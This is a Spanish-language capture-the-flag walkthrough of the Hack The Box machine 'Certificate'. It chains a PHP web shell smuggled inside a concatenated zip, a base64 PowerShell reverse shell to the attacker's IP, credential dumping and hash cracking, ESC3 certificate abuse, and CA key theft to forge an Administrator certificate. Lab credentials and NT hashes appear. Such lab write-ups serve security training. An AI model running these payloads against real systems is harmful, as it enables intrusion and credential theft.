---
tags:
title: Certificate - Hard (HTB)
permalink: /Certificate-HTB-Writeup
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Reconocimiento

Realizamos un escaneo en la red en busca de puertos abiertos y servicios que corren para cada uno. 

```bash 
> nmap -sCV -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49667,49691,49692,49693,49709,49715,49734 10.10.11.71
```
<img width="661" height="558" alt="image" src="https://github.com/zs1n/Pentesting/blob/main/content/posts/images/Pasted image 20250721223110.png" />



Por el puerto 80 vemos un servicio `HTTP` que parece ser una pagina web donde en la ruta `http://certificate.htb/course-details.php?id=1` vemos una seccion para subir archivos zip, pdf, xlsx, etc.
Para burlarlo e intentar subir un archivo `php` hacemos lo siguiente:

Creamos un script que mediante el parametro `0` en la url una vez logremos subir el archivo podamos ejecutar comandos.
```bash 
echo "<?=`$_GET[0]`?>" > shell.php
```

Creamos un pdf con cualquier contenido.
```bash 
echo -n "1" > test.pdf
```

Comprimimos el Pdf.
```bash 
zip 1.zip test.pdf
```

Comprimimos el archivo `php`.
```bash 
zip 2.zip shell.php
```

Guardamos el contenido de ambos en un tercer comprimido `zip`.
```bash 
cat 1.zip 2.zip > 3.zip
```

Ya luego despues de subir el comprimido, la web los descomprime automaticamente lo que hace que queden sueltos nuestro archivos, y donde por medio de la url tenemos un ejecucion remota de comandos, asi que procedemos a enviarnos una `Reverse Shell` hacia nuestra maquina.

Nos ponemos en escucha a la espera de nuestra `Shell`.
```bash 
rlwrap -cAr nc -nlvp 4444
```

Mediante la url enviamos en `base64` una `Reverse Shell` hacia nuestra maquina.
```bash 
http://certificate.htb/statics/uploads/shell.php?0=powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4AMgAzACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==
```

Mientras enumeramos vemos que en la ruta `C:\xampp\htdocs\certificate.htb` hay un archivo `db.php` con credenciales hacia una base de datos que corre en el sistema. 

<img width="661" height="558" alt="image" src="https://github.com/zs1n/Pentesting/blob/main/content/posts/images/Pasted image 20250721231942.png" />


`certificate_webapp_user:cert!f!c@teDBPWD`

Donde luego en la ruta `C:\xampp\mysql\bin` esta el ejecutable de la base de datos a la que nos debemos conectar.
```bash 
> .\mysqldump -u certificate_webapp_user -p'cert!f!c@teDBPWD' Certificate_WEBAPP_DB
```
Vemos 2 hashes de dos usuarios.

<img width="661" height="558" alt="image" src="https://github.com/zs1n/Pentesting/blob/main/content/posts/images/Pasted image 20250721233730.png" />


`sara.b:Blink182`

```bash
> impacket-getTGT 'certificate.htb/sara.b:Blink182' -dc-ip 10.10.11.71
```

```bash 
> export KRB5CCNAME=sara.b.ccache
```

```bash 
> crackmapexec winrm 10.10.11.71 -u sara.b -p Blink182
```
<img width="661" height="558" alt="image" src="https://github.com/zs1n/Pentesting/blob/main/content/posts/images/Pasted image 20250721234211.png" />


```bash 
> evil-winrm -i certificate.htb -u sara.b -p Blink182
```
<img width="661" height="558" alt="image" src="https://github.com/zs1n/Pentesting/blob/main/content/posts/images/Pasted image 20250722002124.png" />


Formato de un hash `Kerberos Pre-Auth`.
<img width="661" height="558" alt="image" src="https://github.com/zs1n/Pentesting/blob/main/content/posts/images/Pasted image 20250722002306.png" />


`$krb5pa$18$user$domain/realm$hash`

<img width="661" height="558" alt="image" src="https://github.com/zs1n/Pentesting/blob/main/content/posts/images/Pasted image 20250722002100.png" />


`$krb5pa$18$Lion.SK$CERTIFICATE.HTB$23f5159fa1c66ed7b0e561543eba6c010cd31f7e4a4377c2925cf306b98ed1e4f3951a50bc083c9bc0f16f0f586181c9d4ceda3fb5e852f0:!QAZ2wsx

`Lion.SK:!QAZ2wsx`

```bash 
> crackmapexec winrm 10.10.11.71 -u Lion.SK -p '!QAZ2wsx'
```

```bash 
> impacket-getTGT 'certificate.htb/lion.sk:!QAZ2wsx' -dc-ip 10.10.11.71
```

```bash 
> export KRB5CCNAME=lion.sk.ccache
```


```bash 
>   evil-winrm -i certificate.htb -u lion.sk -p '!QAZ2wsx'
```

```bash 
> type ../desktop/user.txt
```

---
# Root Flag

### ESC3 

Vemos que el usuario `Lion.SK` es parte del grupo `DOMAIN-CRA-MANAGER` los cuales se encargan de emitir y revocar certificados dentro del todo el `Active Directory`, por lo que podemos emitir un certificado para cualquier usuario.

```bash 
> certipy-ad find -u Lion.SK -p '!QAZ2wsx' -dc-host certificate.htb -target 10.10.11.71 -dc-ip 10.10.11.71 -vulnerable
```
<img width="661" height="558" alt="image" src="https://github.com/zs1n/Pentesting/blob/main/content/posts/images/Pasted image 20250722022247.png" />


```bash 
> certipy-ad  req \
    -u 'Lion.SK@certificate.htb' -p '!QAZ2wsx' \
    -dc-ip '10.10.11.71' -target 'dc01.certificate.htb' \
    -ca 'Certificate-LTD-CA' -template 'Delegated-CRA'
```


Si intentamos solicitar el certificado del usuario `Administrator` no nos deja.
```bash 
> certipy-ad req \ 
    -u 'Lion.SK@certificate.htb' -p '!QAZ2wsx' \
    -dc-ip '10.10.11.71' -target 'dc01.certificate.htb' \
    -ca 'Certificate-LTD-CA' -template 'Delegated-CRA' \
    -pfx 'lion.sk.pfx' -on-behalf-of 'certificate\Administrator'
```

Entonces tratamos de solicitar un certificado del usuario `Ryan.K` el cual esta dentro del grupo `Domain-Storage-Manager` los cuales son los encargados de tareas a nivel de volumen, tales como el mantenimiento, desfragmentación y gestión de particiones y discos.

```bash 
> certipy-ad req -u 'lion.sk@CERTIFICATE.HTB' -p "\!QAZ2wsx" -dc-ip '10.10.11.71' -target 'DC01.CERTIFICATE.HTB' -ca 'Certificate-LTD-CA' -template 'SignedUser' -pfx 'lion.sk.pfx' -on-behalf-of 'CERTIFICATE\ryan.k'
```

```bash
certipy-ad  auth -pfx 'ryan.k.pfx' -dc-ip '10.10.11.71'
```
<img width="661" height="558" alt="image" src="https://github.com/zs1n/Pentesting/blob/main/content/posts/images/Pasted image 20250722025051.png" />


Obtenemos asi su hash `NT`
`aad3b435b51404eeaad3b435b51404ee:b1bc3d70e70f4f36b1509a65ae1a2ae6`

```bash 
> evil-winrm -i certificate.htb -u ryan.k -H 'b1bc3d70e70f4f36b1509a65ae1a2ae6'
```

Una vez dentro de la maquina como el usuario `Ryan.K` vemos que tenemos privilegios `SeManageVolumePrivilege` el cual nos permite navegar libremente por el disco `C:` del sistema leyendo asi archivos confidenciales.

```bash 
> whoami /priv
```


Utilizamos un exploit para la explotacion de este privilegio.
```bash 
git clone https://github.com/CsEnox/SeManageVolumeExploit
```

Para ejecutarlo.
```powershell 
> .\SeManageVolumeExploit.exe
```

Para listar el almacen de certificados del Usuario actual. En el que podes visualizar el id, subject, keyset, Template de cada certificado.
```bash 
> certutil -Store My
```

<img width="661" height="558" alt="image" src="https://github.com/zs1n/Pentesting/blob/main/content/posts/images/Pasted image 20250722025839.png" />


Vemos el certificado `2` El cual pertenece a Root Certification Authority.

```bash 
> certutil -exportPFX My 75b2f4bbf31f108945147b466131bdca Certificate-LTD-CA.pfx
```

Nos lo descargamos.

```bash 
> download Certificate-LTD-CA.pfx
```

Ya desde nuestra maquina intentamos autenticarlo como el usuario `Administrator` pero fallamos.

`> certipy-ad auth -pfx Certificate-LTD-CA.pfx -dc-ip 10.10.11.71 -user Administrator -domain certificate.htb`

Entonces pasamos a forjar un nuevo certificado malicioso apartir del `CA` que comprometimos y  nos descargamos.

```bash 
> certipy-ad forge -ca-pfx Certificate-LTD-CA.pfx -out fake.pfx -upn administrator
```

Ahora lo validamos nuevamente.
```bash 
> certipy-ad auth -pfx fake.pfx -dc-ip 10.10.11.71 -user Administrator -domain certificate.htb
```

Hash `NT`obtenido.

`Got hash for 'administrator@certificate.htb': aad3b435b51404eeaad3b435b51404ee:d804304519bf0143c14cbf1c024408c6`

```bash 
> evil-winrm -i certificate.htb -u Administrator -H "d804304519bf0143c14cbf1c024408c6"
```

```bash 
> type ../Desktop/root.txt
```

`~Happy Hacking.`
